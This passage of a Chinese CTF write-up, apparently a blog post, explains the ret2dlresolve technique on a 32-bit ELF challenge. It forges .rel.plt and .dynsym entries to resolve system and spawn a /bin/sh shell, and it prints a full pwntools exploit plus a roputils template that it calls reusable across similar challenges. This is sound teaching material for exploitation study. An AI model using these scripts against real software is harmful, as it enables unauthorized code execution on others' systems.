LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure>
+
+<p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p>
+<h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure>
+
+<p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br></pre></td></tr></table></figure>
+
+<p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>成员</th>
+<th>说明</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sh_name</td>
+<td>节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_type</td>
+<td>根据节的内容和语义进行分类，具体的类型下面会介绍。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_flags</td>
+<td>每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_addr</td>
+<td>如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_offset</td>
+<td>给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset</td>
+<td>成员给出的是概念性的偏移。</td>
+</tr>
+<tr>
+<td>sh_size</td>
+<td>此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_link</td>
+<td>此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_info</td>
+<td>此成员给出附加信息，其解释依赖于节区类型。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_addralign</td>
+<td>某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。</td>
+<td></td>
+</tr>
+<tr>
+<td>sh_entsize</td>
+<td>某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>sh_addr就是取这个地址，取进程镜像中的地址</p>
+<h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul>
+<li>如果这部分不理解，你就。。。</li>
+<li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li>
+<li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li>
+</ul>
+<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">#对齐</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p>
+<p>0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444</p>
+<p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p>
+<ul>
+<li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li>
+<li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li>
+<li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li>
+</ul>
+<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">#构造.rel.plt表</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li>
+<li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li>
+<li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li>
+<li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li>
+<li>flat([])就是将里面的全变成字符</li>
+</ul>
+<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li>
+<li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li>
+</ul>
+<h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index_offset = base_stage + 24 - rel_plt</span><br></pre></td></tr></table></figure>
+
+<p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p>
+<h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p>
+<h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>初始化ROP链和参数</p>
+<p>#### 第二部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</p>
+</li>
+<li><p>然后传入偏移,32位是用栈传参的，也就是这样</p>
+</li>
+<li><p>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</p>
+</li>
+</ul>
+<h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>bbbb为返回地址</p>
+</li>
+<li><p>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数</p>
+<p>这里具体为什么是这里，你可以从gdb调试看出来，他里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;: push   eax</span><br><span class="line"> 0xf7f7e6c1 &lt;+1&gt;: push   ecx</span><br><span class="line"> 0xf7f7e6c2 &lt;+2&gt;: push   edx</span><br><span class="line"> 0xf7f7e6c3 &lt;+3&gt;: mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line"> 0xf7f7e6c7 &lt;+7&gt;: mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line"> 0xf7f7e6cb &lt;+11&gt;:    call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line"> 0xf7f7e6d0 &lt;+16&gt;:    pop    edx</span><br><span class="line"> 0xf7f7e6d1 &lt;+17&gt;:    mov    ecx,DWORD PTR [esp]</span><br><span class="line"> 0xf7f7e6d4 &lt;+20&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line"> 0xf7f7e6d7 &lt;+23&gt;:    mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line"> 0xf7f7e6db &lt;+27&gt;:    ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172916-147155ac-7306-1.png" alt="img"></p>
+</li>
+<li><p>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" alt="img"></a></p>
+</li>
+<li><p>这里arg[0]就是返回地址，</p>
+</li>
+<li><p>arg[1]就是参数了</p>
+</li>
+<li><p>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</p>
+</li>
+</ul>
+<h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行填充，使位置达到base_stage + 24</li>
+</ul>
+<h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>填入.rel.plt里的一个结构体，用于解析函数</li>
+</ul>
+<h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(align * &apos;a&apos;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>填充对齐部分</p>
+<p>#### 第七部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</p>
+</li>
+</ul>
+<h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;system\x00&apos;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print len(rop.chain())</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh</p>
+<p>#### 第十部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br><span class="line">index_offset = base_stage + 24 - rel_plt</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * &apos;a&apos;)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(&apos;system\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print len(rop.chain())</span><br><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p>
+<h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul>
+<li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li>
+<li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li>
+<li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了<br><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">processName = &apos;pwn&apos;</span><br><span class="line">offset = 44</span><br><span class="line"></span><br><span class="line">r = process(&apos;./&apos; + processName)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">rop = ROP(&apos;./&apos; + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul>
+<li>以后遇到高级ROP这种题就一把梭了</li>
+<li>妈妈在也不用担心我遇到栈的这种问题了</li>
+<li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/09/14/CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟/" rel="next" title="CG-CTF南邮RE逆向题笔记">
+                  <i class="fa fa-chevron-left"></i> CG-CTF南邮RE逆向题笔记
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/" rel="prev" title="黑盾杯-2019-PWN-easypwn">
+                  黑盾杯-2019-PWN-easypwn <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dllruntime-原理"><span class="nav-number">1.</span> <span class="nav-text">ret2dllruntime 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elf部分的关键点（来自ctf-wiki"><span class="nav-number">3.</span> <span class="nav-text">elf部分的关键点（来自ctf-wiki)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解析"><span class="nav-number">4.</span> <span class="nav-text">解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><span class="nav-number">4.1.</span> <span class="nav-text">第一个表是.rel.plt也就是ELF REL Relocation Table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个表是-dynsym也就是ELF-Symbol-Table"><span class="nav-number">4.2.</span> <span class="nav-text">第二个表是.dynsym也就是ELF Symbol Table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三个表就是-dynstr了，也就是ELF-String-Table"><span class="nav-number">4.3.</span> <span class="nav-text">第三个表就是.dynstr了，也就是ELF String Table</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp详解"><span class="nav-number">5.</span> <span class="nav-text">exp详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#接下来是重点了"><span class="nav-number">5.1.</span> <span class="nav-text">接下来是重点了</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一部分"><span class="nav-number">5.1.1.</span> <span class="nav-text">第一部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二部分"><span class="nav-number">5.1.2.</span> <span class="nav-text">第二部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三部分"><span class="nav-number">5.1.3.</span> <span class="nav-text">第三部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四部分"><span class="nav-number">5.1.4.</span> <span class="nav-text">第四部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP链的构造"><span class="nav-number">5.2.</span> <span class="nav-text">ROP链的构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一部分-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">第一部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三部分-1"><span class="nav-number">5.2.2.</span> <span class="nav-text">第三部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四部分-1"><span class="nav-number">5.2.3.</span> <span class="nav-text">第四部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第五部分"><span class="nav-number">5.2.4.</span> <span class="nav-text">第五部分</span></a></li><li class="nav-item nav-level-4"><a 